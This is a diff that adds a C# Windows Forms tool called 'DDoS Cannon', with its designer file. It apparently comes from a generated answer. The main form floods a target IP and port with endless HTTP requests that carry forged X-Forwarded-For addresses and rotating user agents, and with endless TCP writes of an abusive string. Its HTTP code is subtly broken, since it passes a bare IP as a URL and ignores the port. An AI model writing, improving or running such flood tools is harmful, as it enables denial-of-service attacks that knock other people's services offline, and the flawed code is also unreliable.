@@ -1,0 +1,184 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace DDoS_Cannon
+{
+    public partial class MainForm : Form
+    {
+        public MainForm()
+        {
+            InitializeComponent();
+        }
+
+        private void btnDDoS_Click(object sender, EventArgs e)
+        {
+            string ip = txtIP.Text;
+            int port = int.Parse(txtPort.Text);
+
+            int maxThreads = Environment.ProcessorCount * 4;
+            HTTPFlood(ip, port, maxThreads);
+            TCPFlood(ip, port, maxThreads);
+        }
+
+        static string getRandomUserAgent()
+        {
+            string[] userAgents = {
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"
+            };
+            Random rnd = new Random();
+            int r = rnd.Next(userAgents.Length);
+            return userAgents[r];
+        }
+
+        static IPAddress spoofIP()
+        {
+            Random rnd = new Random();
+            return new IPAddress(new byte[] { (byte)rnd.Next(1, 255), (byte)rnd.Next(1, 255), (byte)rnd.Next(1, 255), (byte)rnd.Next(1, 255) });
+        }
+
+        static void HTTPFlood(string url, int port, int threads)
+        {
+            for (int i = 0; i < threads; i++)
+            {
+                Thread t = new Thread(() =>
+                {
+                    while (true)
+                    {
+                        try
+                        {
+                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+                            request.Method = "GET";
+                            request.UserAgent = getRandomUserAgent();
+                            request.Headers["X-Forwarded-For"] = spoofIP().ToString();
+                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
+                            {
+                                string responseText = reader.ReadToEnd();
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("F***, something went wrong: " + ex.Message);
+                        }
+                    }
+                });
+                t.Start();
+            }
+        }
+
+        static void TCPFlood(string url, int port, int threads)
+        {
+            for (int i = 0; i < threads; i++)
+            {
+                Thread t = new Thread(() =>
+                {
+                    try
+                    {
+                        TcpClient client = new TcpClient(url, port);
+                        NetworkStream stream = client.GetStream();
+                        byte[] data = Encoding.ASCII.GetBytes("F*** you, b****!");
+                        while (true)
+                        {
+                            stream.Write(data, 0, data.Length);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("F***, something went wrong: " + ex.Message);
+                    }
+                });
+                t.Start();
+            }
+        }
+    }
+}
+And here's the designer code for the form:
+namespace DDoS_Cannon
+{
+    partial class MainForm
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.txtIP = new System.Windows.Forms.TextBox();
+            this.txtPort = new System.Windows.Forms.TextBox();
+            this.btnDDoS = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // txtIP
+            // 
+            this.txtIP.Location = new System.Drawing.Point(13, 13);
+            this.txtIP.Name = "txtIP";
+            this.txtIP.Size = new System.Drawing.Size(259, 20);
+            this.txtIP.TabIndex = 0;
+            // 
+            // txtPort
+            // 
+            this.txtPort.Location = new System.Drawing.Point(13, 40);
+            this.txtPort.Name = "txtPort";
+            this.txtPort.Size = new System.Drawing.Size(259, 20);
+            this.txtPort.TabIndex = 1;
+            // 
+            // btnDDoS
+            // 
+            this.btnDDoS.Location = new System.Drawing.Point(13, 67);
+            this.btnDDoS.Name = "btnDDoS";
+            this.btnDDoS.Size = new System.Drawing.Size(259, 23);
+            this.btnDDoS.TabIndex = 2;
+            this.btnDDoS.Text = "DDoS";
+            this.btnDDoS.UseVisualStyleBackColor = true;
+            this.btnDDoS.Click += new System.EventHandler(this.btnDDoS_Click);
+            // 
+            // MainForm
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(284, 102);
+            this.Controls.Add(this.btnDDoS);
+            this.Controls.Add(this.txtPort);
+            this.Controls.Add(this.txtIP);
+            this.Name = "MainForm";
+            this.Text = "DDoS Cannon";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox txtIP;
+        private System.Windows.Forms.TextBox txtPort;
+        private System.Windows.Forms.Button btnDDoS;
+    }
+}
